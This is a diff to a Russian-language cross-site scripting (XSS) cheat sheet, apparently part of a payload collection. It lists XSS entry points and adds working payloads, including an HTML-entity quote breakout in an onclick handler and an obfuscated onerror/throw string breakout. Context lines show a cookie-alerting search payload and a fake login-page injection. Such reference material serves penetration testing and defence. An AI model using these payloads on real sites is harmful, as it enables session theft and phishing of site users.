@@ -122,11 +122,11 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 # Идентификация XSS-точки входа
 
 * **Точки входа**
-    * Между HTML-тегами: <title>any_code; YOUR_DATA; any_code</title>.
-    * В HTML-атрибутах: <a any_attribute="any_data YOUR_DATA"></a>.
-    * Между JavaScript-тегами: <script>any_code; YOUR_DATA; any_code</script>.
-    * Внутри JavaScript-строки: <script>a = "some"; b="some1 YOUR_DATA"</script>.
-    * Параметры запроса — search.
+    * Между HTML-тегами: `<title>any_code; YOUR_DATA; any_code</title>`.
+    * В HTML-атрибутах: `<a any_attribute="any_data YOUR_DATA"></a>`.
+    * Между JavaScript-тегами: `<script>any_code; YOUR_DATA; any_code</script>`.
+    * Внутри JavaScript-строки: `<script>a = "some"; b="some1 YOUR_DATA"</script>`.
+    * Параметры запроса — `search`.
     * Заголовки запроса
     * Название прикрепляемых файлов.
     
@@ -197,6 +197,12 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 # XSS в HTML/приложениях
 
 ## Распространённые полезные нагрузки
+
+**Использование HTML-кодирования**
+```javascript
+<a href="#" onclick="... var input='&apos;-alert(document.domain)-&apos;'; ...">
+```
+Последовательность `&apos;` — это HTML-сущность, представляющая апостроф или одиночную кавычку. Поскольку браузер выполняет HTML-декодирование значения атрибута `onclick` перед интерпретацией JavaScript, сущности декодируются как кавычки, которые становятся разделителями строк, и атака успешна.
 
 **Кастом:**
 ```javascript
@@ -339,7 +345,9 @@ location='/site/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'
 ---
 
 # XSS в обёртках URI
-
+```javascript
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+''{x:'
+```
 ## Обёртка javascript:
 
 ```javascript
